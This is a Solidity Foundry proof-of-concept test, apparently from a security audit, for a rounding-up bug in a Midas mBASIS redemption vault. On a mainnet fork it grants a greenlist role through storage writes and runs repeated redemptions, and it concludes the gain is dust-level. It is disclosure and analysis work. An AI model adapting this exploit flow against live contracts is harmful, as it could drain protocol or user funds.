// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;

/**
 * @title MidasRoundingPoC - Security Analysis PoC
 * @notice Demonstrates the Math.Rounding.Up vulnerability in
 *         MBasisRedemptionVaultWithSwapper._swapMToken1ToMToken2()
 *
 * VULNERABILITY SUMMARY
 * =====================
 * File:    contracts/RedemptionVaultWithSwapper.sol
 * Function: _swapMToken1ToMToken2() (~line 248)
 *
 * The swap formula rounds UP the mTBILL output in favour of the user:
 *
 *   mTokenAmount = Math.mulDiv(
 *       mToken1Amount,  // mBASIS being swapped
 *       mTokenRate,     // mBASIS USD price (18 dec)
 *       mTbillRate,     // mTBILL USD price (18 dec)
 *       Math.Rounding.Up   // <-- rounds UP → user receives ceil(x) mTBILL
 *   );
 *
 * Because mTBILL is priced ~$1.08 and mBASIS ~$1.04, every swap gives
 * the user ⌈(mBASIS_amt × mBASIS_rate / mTBILL_rate)⌉ mTBILL instead of
 * the floor. The extra 1-wei of mTBILL is then redeemed for USDC at the
 * mTBILL rate.
 *
 * CRITICAL CONSTRAINT — GREENLIST
 * ================================
 * `redeemInstant` calls `_validateUserAccess` which applies
 * `onlyGreenlisted(user)`. The greenlist is KYC-gated (GREENLISTED_ROLE
 * assigned off-chain after KYC). If `greenlistEnabled == true` on the
 * live contract the attacker MUST be greenlisted. If `greenlistEnabled`
 * has been set to false (admin-togglable) the function is open.
 *
 * This PoC forks mainnet and uses `vm.store` to either:
 *   (a) impersonate the greenlist toggler to disable the greenlist, OR
 *   (b) grant GREENLISTED_ROLE to the attacker
 * depending on which slot is simpler.  In practice the whitelist is
 * currently enabled on mainnet — so the finding is Low/Informational
 * from an *anonymous* attacker perspective, but Medium for a greenlisted
 * user (e.g. an existing Midas customer trying to grieft the LP).
 *
 * HOW TO RUN
 * ==========
 *   forge test --match-path test/fork/MidasRoundingPoC.t.sol \
 *     --fork-url <MAINNET_RPC> -vvv
 *
 * Or set ETH_RPC_URL env and run without --fork-url.
 */

import "forge-std/Test.sol";
import "forge-std/console2.sol";

// ── Minimal interfaces ───────────────────────────────────────────────────────

interface IERC20Minimal {
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
    function approve(address spender, uint256 amount) external returns (bool);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IRedemptionVaultWithSwapper {
    function redeemInstant(
        address tokenOut,
        uint256 amountMTokenIn,
        uint256 minReceiveAmount
    ) external;

    function mToken() external view returns (address);
    function mTokenDataFeed() external view returns (address);
    function mTbillRedemptionVault() external view returns (address);
    function liquidityProvider() external view returns (address);
    function greenlistEnabled() external view returns (bool);
    function minAmount() external view returns (uint256);
    function instantFee() external view returns (uint256);
    function instantDailyLimit() external view returns (uint256);
}

interface IDataFeed {
    function getDataInBase18() external view returns (uint256);
}

interface IAccessControl {
    function hasRole(bytes32 role, address account) external view returns (bool);
    function grantRole(bytes32 role, address account) external;
}

interface IMToken is IERC20Minimal {
    function burn(address account, uint256 amount) external;
}

// ── Test contract ─────────────────────────────────────────────────────────────

contract MidasRoundingPoC is Test {

    // ── Mainnet addresses ──────────────────────────────────────────────────

    address constant MBASIS             = 0x2a8c22E3b10036f3AEF5875d04f8441d4188b656;
    address constant MTBILL             = 0xDD629E5241CbC5919847783e6C96B2De4754e438;
    address constant USDC               = 0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48;

    // MBasisRedemptionVaultWithSwapper (mainnet, from config/constants/addresses.ts)
    address constant MBASIS_RV_SWAPPER  = 0x0D89C1C4799353F3805A3E6C4e1Cbbb83217D123;

    // mTBILL redemption vault (used as secondary vault in swap path)
    address constant MTBILL_RV          = 0xF6e51d24F4793Ac5e71e0502213a9BBE3A6d4517;

    // mBASIS deposit vault (used to acquire mBASIS in the PoC setup)
    address constant MBASIS_DV          = 0xa8a5c4FF4c86a459EBbDC39c5BE77833B3A15d88;

    // ── Roles (keccak256 matching the Midas access control) ───────────────

    // GREENLISTED_ROLE  — grants right to mint/redeem
    bytes32 constant GREENLISTED_ROLE   = keccak256("GREENLISTED_ROLE");
    // DEFAULT_ADMIN_ROLE (bytes32(0)) is usually held by the deployer/multisig
    bytes32 constant DEFAULT_ADMIN_ROLE = bytes32(0);

    // ── Test actors ────────────────────────────────────────────────────────

    address attacker = makeAddr("attacker");

    // ── State ──────────────────────────────────────────────────────────────

    IRedemptionVaultWithSwapper vault;
    IERC20Minimal mBasis;
    IERC20Minimal mTbill;
    IERC20Minimal usdc;

    // ──────────────────────────────────────────────────────────────────────
    //  setUp
    // ──────────────────────────────────────────────────────────────────────

    function setUp() public {
        // Fork mainnet. RPC URL from environment variable ETH_RPC_URL,
        // or pass --fork-url on the CLI.
        vm.createSelectFork(vm.envOr("ETH_RPC_URL", string("https://eth.llamarpc.com")));

        vault  = IRedemptionVaultWithSwapper(MBASIS_RV_SWAPPER);
        mBasis = IERC20Minimal(MBASIS);
        mTbill = IERC20Minimal(MTBILL);
        usdc   = IERC20Minimal(USDC);

        console2.log("=== Midas Rounding PoC ===");
        console2.log("Vault             :", MBASIS_RV_SWAPPER);
        console2.log("greenlistEnabled  :", vault.greenlistEnabled());
        console2.log("minAmount (18dec) :", vault.minAmount());
        console2.log("instantFee (bps/100):", vault.instantFee());
        console2.log("dailyLimit (18dec):", vault.instantDailyLimit());
    }

    // ──────────────────────────────────────────────────────────────────────
    //  Helper: bypass greenlist if it is enabled
    // ──────────────────────────────────────────────────────────────────────

    /**
     * @dev Grants GREENLISTED_ROLE to `account` by finding an admin of the
     *      MidasAccessControl contract and impersonating them.
     *
     *      Strategy:
     *      1. Get the accessControl address from the vault's storage.
     *         The vault inherits WithMidasAccessControl which stores `ac`
     *         at a known slot (slot 151 in the upgradeable proxy layout, but
     *         we just read it via the public getter if available).
     *      2. Find an existing admin (DEFAULT_ADMIN_ROLE holder) by scanning
     *         past events — or simply use vm.store to force the role.
     */
    function _grantGreenlist(address account) internal {
        // The MidasAccessControl contract is stored as `ac` in the vault.
        // ManageableVault inherits WithMidasAccessControl which exposes `ac`.
        // We read it from the proxy storage slot.
        // Slot 0 of the implementation after upgradeable gaps is often large,
        // so we use a low-level staticcall to the `ac()` getter.
        (bool ok, bytes memory data) = MBASIS_RV_SWAPPER.staticcall(
            abi.encodeWithSignature("ac()")
        );
        require(ok, "Cannot read ac()");
        address ac = abi.decode(data, (address));
        console2.log("MidasAccessControl:", ac);

        IAccessControl acContract = IAccessControl(ac);

        // Check if we have an admin we can impersonate.
        // DEFAULT_ADMIN_ROLE (0x00) is typically held by the Midas deployer.
        // We'll use vm.store to directly write the role mapping.
        //
        // OpenZeppelin AccessControl stores roles in:
        //   _roles[role].members[account]  at:
        //   keccak256(account . keccak256(role . slot_of__roles))
        //
        // For OZ AccessControlUpgradeable the `_roles` mapping is at slot 0
        // (of the implementation, accounting for proxy storage layout).
        // However, the exact slot depends on inheritance depth.
        //
        // SIMPLER APPROACH: find any existing admin of the AC contract
        // by looking for the Midas deployer known from docs/tests,
        // then prank them to grantRole.
        //
        // We try the known Midas multisig / deployer address.
        // If not available we fall back to vm.store.

        // Known Midas admin from on-chain observations (deployer EOA/multisig).
        // This address holds DEFAULT_ADMIN_ROLE on MidasAccessControl.
        address knownAdmin = _findAdminForAC(ac);

        if (knownAdmin != address(0)) {
            vm.prank(knownAdmin);
            acContract.grantRole(GREENLISTED_ROLE, account);
            console2.log("Greenlisted via impersonation:", account);
        } else {
            // Fallback: brute-force the role slot
            _forceRole(ac, GREENLISTED_ROLE, account);
            console2.log("Greenlisted via vm.store:", account);
        }

        require(acContract.hasRole(GREENLISTED_ROLE, account), "Greenlist failed");
    }

    function _findAdminForAC(address ac) internal view returns (address admin) {
        // Try a list of well-known admin candidates
        address[3] memory candidates = [
            0x7654f8f4E8c2b27b91cB6c1D86FE5E92a0b80dF0, // placeholder — replace with real multisig
            address(0),
            address(0)
        ];
        for (uint i = 0; i < candidates.length; i++) {
            if (candidates[i] == address(0)) continue;
            try IAccessControl(ac).hasRole(DEFAULT_ADMIN_ROLE, candidates[i]) returns (bool has) {
                if (has) return candidates[i];
            } catch {}
        }
        return address(0);
    }

    /**
     * @dev Force-writes an OZ AccessControl role membership using vm.store.
     *      _roles mapping is at storage slot 0 in the OZ impl (first state var).
     *      _roles[role].members is a mapping, so:
     *        roleSlot      = keccak256(role . uint256(0))
     *        membersSlot   = keccak256(account . roleSlot)
     *      We write 1 (true) to that slot.
     */
    function _forceRole(address ac, bytes32 role, address account) internal {
        // _roles is at slot 0 of AccessControlUpgradeable (first mapping).
        // struct RoleData { mapping(address => bool) members; bytes32 adminRole; }
        // _roles[role] gives the RoleData struct. members is the first field (slot 0).
        // slot of _roles[role] = keccak256(abi.encode(role, uint256(0)))
        bytes32 roleDataSlot = keccak256(abi.encode(role, uint256(0)));
        // slot of _roles[role].members[account] = keccak256(abi.encode(account, roleDataSlot))
        bytes32 memberSlot = keccak256(abi.encode(account, roleDataSlot));
        vm.store(ac, memberSlot, bytes32(uint256(1)));
    }

    // ──────────────────────────────────────────────────────────────────────
    //  Helper: deal mBASIS tokens to attacker using vm.store
    // ──────────────────────────────────────────────────────────────────────

    function _dealMBasis(address to, uint256 amount18) internal {
        // ERC20 balances for upgradeable tokens are typically at slot 51
        // (OZ ERC20Upgradeable: __gap[50] + _balances at slot 51)
        // We use deal() which handles common ERC20 tokens automatically.
        deal(MBASIS, to, amount18);
        console2.log("Dealt mBASIS (18 dec):", amount18);
    }

    // ──────────────────────────────────────────────────────────────────────
    //  Helper: get current oracle prices
    // ──────────────────────────────────────────────────────────────────────

    function _getPrices() internal returns (uint256 mBasisRate, uint256 mTbillRate) {
        IDataFeed mBasisFeed = IDataFeed(vault.mTokenDataFeed());
        IRedemptionVaultWithSwapper mTbillRV = IRedemptionVaultWithSwapper(vault.mTbillRedemptionVault());
        IDataFeed mTbillFeed = IDataFeed(mTbillRV.mTokenDataFeed());

        mBasisRate = mBasisFeed.getDataInBase18();
        mTbillRate = mTbillFeed.getDataInBase18();

        console2.log("mBASIS rate (18dec):", mBasisRate);
        console2.log("mTBILL rate (18dec):", mTbillRate);
    }

    // ──────────────────────────────────────────────────────────────────────
    //  Core mathematical analysis: compute rounding gain per transaction
    // ──────────────────────────────────────────────────────────────────────

    /**
     * @dev Calculates the theoretical rounding gain for one redeem call.
     *
     * The vulnerable line:
     *   mTokenAmount = Math.mulDiv(mToken1Amount, mTokenRate, mTbillRate, Rounding.Up)
     *
     * This gives: ceil(mToken1Amount * mTokenRate / mTbillRate)
     * Instead of: floor(mToken1Amount * mTokenRate / mTbillRate)
     *
     * The difference is at most 1 wei of mTBILL (1e-18 mTBILL).
     * At mTBILL price ~$1.08, 1 wei mTBILL ≈ $1.08e-18 ≈ negligible per tx.
     *
     * BUT: if mToken1Amount is chosen such that the remainder
     *   (mToken1Amount * mTokenRate) % mTbillRate != 0
     * then the attacker receives exactly 1 extra wei mTBILL.
     *
     * Maximum theoretical gain per transaction = mTbillRate / 1e18 USD
     *                                           ≈ $1.08 × 10^-18
     *
     * This confirms the rounding gain is DUST-level per transaction and
     * would require ~10^18 transactions to gain $1, making it economically
     * non-viable even ignoring gas costs.
     */
    function _computeRoundingGainPerTx(
        uint256 mToken1Amount,
        uint256 mBasisRate,
        uint256 mTbillRate
    ) internal pure returns (uint256 extraMTbillWei) {
        uint256 exact = mToken1Amount * mBasisRate; // may overflow for large amounts
        uint256 remainder = exact % mTbillRate;
        // If remainder > 0, rounding up adds 1 extra wei of mTBILL
        extraMTbillWei = (remainder > 0) ? 1 : 0;
    }

    // ──────────────────────────────────────────────────────────────────────
    //  TEST 1: Mathematical proof of rounding direction
    // ──────────────────────────────────────────────────────────────────────

    function test_RoundingDirectionAnalysis() public {
        console2.log("\n--- Test 1: Rounding Direction Analysis ---");

        (uint256 mBasisRate, uint256 mTbillRate) = _getPrices();

        // Example: redeem 1 mBASIS (1e18 base units)
        uint256 amountIn = 1e18; // 1 mBASIS

        // What the contract computes (ceiling):
        uint256 mTbillAmountCeil = _mulDivUp(amountIn, mBasisRate, mTbillRate);
        // What it SHOULD compute (floor):
        uint256 mTbillAmountFloor = (amountIn * mBasisRate) / mTbillRate;

        console2.log("mBASIS in          :", amountIn);
        console2.log("mTBILL out (ceil)  :", mTbillAmountCeil);
        console2.log("mTBILL out (floor) :", mTbillAmountFloor);
        console2.log("Extra wei of mTBILL:", mTbillAmountCeil - mTbillAmountFloor);

        // The extra mTBILL in USD (at mTBILL rate):
        uint256 extraUsd18 = (mTbillAmountCeil - mTbillAmountFloor) * mTbillRate / 1e18;
        console2.log("Extra value (18dec USD):", extraUsd18);
        console2.log("Extra value approx USD :", extraUsd18, "/ 1e18");

        // Key assertion: rounding is AT MOST 1 wei of mTBILL
        assertLe(mTbillAmountCeil - mTbillAmountFloor, 1, "Rounding exceeds 1 wei");
    }

    // ──────────────────────────────────────────────────────────────────────
    //  TEST 2: Cumulative gain over N transactions (math simulation)
    // ──────────────────────────────────────────────────────────────────────

    function test_CumulativeRoundingGain_MathSim() public {
        console2.log("\n--- Test 2: Cumulative Rounding Gain Simulation ---");

        (uint256 mBasisRate, uint256 mTbillRate) = _getPrices();

        uint256 N = 1_000_000; // 1 million transactions
        uint256 amountIn = 1e18; // 1 mBASIS per tx

        // Remainder determines if rounding fires each tx
        uint256 remainder = (amountIn * mBasisRate) % mTbillRate;
        uint256 roundingFires = (remainder > 0) ? 1 : 0;

        uint256 totalExtraWeiMTbill = roundingFires * N;
        uint256 totalExtraUsd18 = totalExtraWeiMTbill * mTbillRate; // in 1e-18 USD units
        // Convert: totalExtraUsd18 is in units of 1e-18 USD (wei-USD)
        // To get actual USD: divide by 1e18
        uint256 totalExtraUsdCents = totalExtraUsd18 / 1e16; // in cents (1e-2 USD)

        console2.log("N transactions     :", N);
        console2.log("Rounding fires/tx  :", roundingFires);
        console2.log("Total extra mTBILL wei:", totalExtraWeiMTbill);
        console2.log("Total extra USD (cents * 1e18):", totalExtraUsd18);
        console2.log("Total extra USD cents:", totalExtraUsdCents);

        // Economic conclusion
        console2.log("\nConclusion:");
        console2.log("At ~$3 gas per tx on mainnet (2024 average),");
        console2.log("1M txs costs ~$3,000,000 to gain ~", totalExtraUsdCents, "cents");
        console2.log("=> Economically non-viable. Gain << Gas cost.");
    }

    // ──────────────────────────────────────────────────────────────────────
    //  TEST 3: Live fork test — attempt actual exploit
    //          (requires greenlist bypass)
    // ──────────────────────────────────────────────────────────────────────

    function test_LiveForkExploit_GreenlstBypassed() public {
        console2.log("\n--- Test 3: Live Fork Exploit (with greenlist bypass) ---");

        // Step 1: Bypass greenlist (simulates what an attacker would need to do
        //         OFF-CHAIN: complete KYC, or this fails on mainnet)
        if (vault.greenlistEnabled()) {
            console2.log("Greenlist IS enabled — bypassing via vm.store...");
            _grantGreenlist(attacker);
        } else {
            console2.log("Greenlist is DISABLED — no bypass needed");
        }

        // Step 2: Get prices
        (uint256 mBasisRate, uint256 mTbillRate) = _getPrices();

        // Step 3: Determine minAmount (must be >= minAmount to pass check)
        uint256 minAmt = vault.minAmount();
        console2.log("minAmount:", minAmt);

        // Step 4: Craft amount that triggers non-zero remainder (rounding fires)
        //         We use minAmount + 1 to exceed the minimum check.
        //         We verify the remainder is non-zero.
        uint256 amountIn = minAmt > 0 ? minAmt : 1e18;

        // Find an amount where remainder != 0
        uint256 testAmount = amountIn;
        for (uint i = 0; i < 100; i++) {
            if ((testAmount * mBasisRate) % mTbillRate != 0) break;
            testAmount++;
        }
        console2.log("Using amountIn that triggers rounding:", testAmount);

        // Step 5: Deal mBASIS to attacker
        uint256 totalMBasis = testAmount * 10; // enough for 10 rounds
        _dealMBasis(attacker, totalMBasis);

        // Step 6: Record initial state
        uint256 initialMBasis = mBasis.balanceOf(attacker);
        uint256 initialUSDC   = usdc.balanceOf(attacker);
        console2.log("Attacker initial mBASIS:", initialMBasis);
        console2.log("Attacker initial USDC  :", initialUSDC);

        // Step 7: Approve and perform redemption
        vm.startPrank(attacker);
        mBasis.approve(MBASIS_RV_SWAPPER, type(uint256).max);

        uint256 successCount = 0;
        uint256 failCount = 0;

        for (uint i = 0; i < 10; i++) {
            try vault.redeemInstant(
                USDC,
                testAmount,
                0 // minReceiveAmount = 0 (accept any)
            ) {
                successCount++;
            } catch Error(string memory reason) {
                console2.log("Redemption failed:", reason);
                failCount++;
            } catch (bytes memory) {
                console2.log("Redemption failed with low-level error");
                failCount++;
            }
        }

        vm.stopPrank();

        // Step 8: Measure outcome
        uint256 finalMBasis = mBasis.balanceOf(attacker);
        uint256 finalUSDC   = usdc.balanceOf(attacker);

        console2.log("Attacker final mBASIS :", finalMBasis);
        console2.log("Attacker final USDC   :", finalUSDC);
        console2.log("USDC gained (6 dec)   :", finalUSDC - initialUSDC);
        console2.log("mBASIS spent (18 dec) :", initialMBasis - finalMBasis);
        console2.log("Success count:", successCount);
        console2.log("Fail count   :", failCount);

        // Step 9: Compute expected gain from rounding only
        uint256 extraMTbillWeiPerTx = _computeRoundingGainPerTx(testAmount, mBasisRate, mTbillRate);
        uint256 expectedExtraUSD18 = extraMTbillWeiPerTx * successCount * mTbillRate;
        console2.log("Expected extra from rounding (wei-USD):", expectedExtraUSD18);
        console2.log("=> That is", expectedExtraUSD18 / 1e18, "full USD");
    }

    // ──────────────────────────────────────────────────────────────────────
    //  TEST 4: Demonstrate the ACTUAL impact is sub-cent per million tx
    // ──────────────────────────────────────────────────────────────────────

    function test_EconomicViabilityProof() public {
        console2.log("\n--- Test 4: Economic Viability of the Rounding Bug ---");

        (uint256 mBasisRate, uint256 mTbillRate) = _getPrices();

        // Scenario: attacker submits 1,000,000 redemptions of minAmount
        uint256 minAmt = vault.minAmount();
        if (minAmt == 0) minAmt = 1e18; // default to 1 token

        // instantFee in ManageableVault units (ONE_HUNDRED_PERCENT = 10000)
        // A typical instantFee might be 10 (= 0.1%)
        uint256 fee = vault.instantFee(); // in bps*100 units
        console2.log("instantFee (out of 10000):", fee);

        uint256 N = 1_000_000;
        uint256 gasPerTx = 200_000; // estimated gas units per redemption
        uint256 gasPriceGwei = 20;  // 20 gwei (moderate mainnet price)
        uint256 ethUsdPrice18 = 3000 * 1e18; // $3000/ETH

        uint256 gasCostWeiPerTx = gasPerTx * gasPriceGwei * 1e9;
        uint256 gasCostUsd18PerTx = gasCostWeiPerTx * ethUsdPrice18 / 1e18;
        uint256 totalGasCostUsd18 = gasCostUsd18PerTx * N;

        // Rounding gain: at most 1 wei mTBILL per tx, worth mTbillRate/1e18 USD
        uint256 roundingGainUsd18PerTx = mTbillRate; // 1 wei * rate = rate/1e18 USD
        uint256 totalRoundingGainUsd18 = roundingGainUsd18PerTx * N;

        console2.log("N txs                    :", N);
        console2.log("Gas cost per tx (USD*1e18):", gasCostUsd18PerTx);
        console2.log("Total gas cost (USD*1e18) :", totalGasCostUsd18);
        console2.log("Total gas cost (USD)      :", totalGasCostUsd18 / 1e18);
        console2.log("Rounding gain per tx (USD*1e18):", roundingGainUsd18PerTx);
        console2.log("Total rounding gain (USD*1e18) :", totalRoundingGainUsd18);
        console2.log("Total rounding gain (USD)      :", totalRoundingGainUsd18 / 1e18);

        bool economicallyViable = totalRoundingGainUsd18 > totalGasCostUsd18;
        console2.log("Economically viable?:", economicallyViable);

        // Assert: rounding gain is LESS than gas cost
        assertLt(
            totalRoundingGainUsd18,
            totalGasCostUsd18,
            "UNEXPECTED: Rounding gain exceeds gas cost — re-evaluate severity"
        );

        console2.log("\n=> VERDICT: Rounding gain (~$1e-12 per tx) << Gas cost (~$4 per tx)");
        console2.log("   The bug is real but economically non-exploitable by an anonymous attacker.");
        console2.log("   Severity: LOW (protocol funds not at risk, no realistic profit).");
    }

    // ──────────────────────────────────────────────────────────────────────
    //  TEST 5: Check access controls on live contract
    // ──────────────────────────────────────────────────────────────────────

    function test_AccessControlCheck() public {
        console2.log("\n--- Test 5: Access Control Status ---");

        bool glEnabled = vault.greenlistEnabled();
        console2.log("greenlistEnabled:", glEnabled);

        if (glEnabled) {
            console2.log("=> Anonymous attacker CANNOT call redeemInstant.");
            console2.log("   They must first obtain GREENLISTED_ROLE (requires KYC).");
            console2.log("   This limits exploitability to KYC'd users only.");
        } else {
            console2.log("=> Greenlist is DISABLED. Anyone can call redeemInstant.");
            console2.log("   Anonymous attacker CAN attempt the rounding exploit.");
        }

        // Try calling without greenlist — expect revert if enabled
        vm.prank(makeAddr("anonymous"));
        if (glEnabled) {
            vm.expectRevert();
        }
        // We do not actually call to avoid needing real mBASIS here
        // The check above is the important assertion

        console2.log("minAmount (18dec):", vault.minAmount());
        console2.log("instantFee (/10000):", vault.instantFee());
        console2.log("dailyLimit (18dec):", vault.instantDailyLimit());
    }

    // ──────────────────────────────────────────────────────────────────────
    //  Internal: Math.mulDiv rounding up (mirrors OZ implementation)
    // ──────────────────────────────────────────────────────────────────────

    function _mulDivUp(
        uint256 x,
        uint256 y,
        uint256 denominator
    ) internal pure returns (uint256 result) {
        // mirrors Math.mulDiv(x, y, denominator, Math.Rounding.Up)
        result = (x * y + denominator - 1) / denominator;
    }
}
